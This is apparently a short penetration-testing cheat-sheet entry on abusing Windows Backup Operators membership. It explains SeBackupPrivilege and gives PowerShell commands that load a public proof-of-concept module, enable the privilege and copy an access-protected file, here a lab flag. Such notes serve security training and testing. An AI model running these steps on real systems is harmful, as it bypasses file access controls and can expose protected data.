# Backup Operators

## <mark style="color:yellow;">About</mark>

<mark style="color:red;">**Membership**</mark> of this group <mark style="color:purple;">**grants its members**</mark> the <mark style="color:green;">`SeBackup`</mark> and <mark style="color:green;">`SeRestore`</mark> privileges. The <mark style="color:green;">`SeBackupPrivilege`</mark> allows us to <mark style="color:purple;">**traverse any folder and list the folder contents**</mark>. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the **FILE\_FLAG\_BACKUP\_SEMANTICS** flag.

We can use this PoC [**\[LINK\]**](https://github.com/giuliano108/SeBackupPrivilege) to exploit the <mark style="color:green;">`SeBackupPrivilege`</mark>, and copy forbidden files.

#### Importing Required Libraries

```powershell
PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Enabling `SeBackupPrivilege`

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Set-SeBackupPrivilege
</strong>PS C:\> whoami /priv # verifying
PS C:\> Get-SeBackupPrivilege # verifying
</code></pre>

#### Copying a Protected File

```powershell
PS C:\> Copy-FileSeBackupPrivilege 'C:\Users\venator17\flag.txt' .\flag.txt
PS C:\> cat .\flag.txt
```
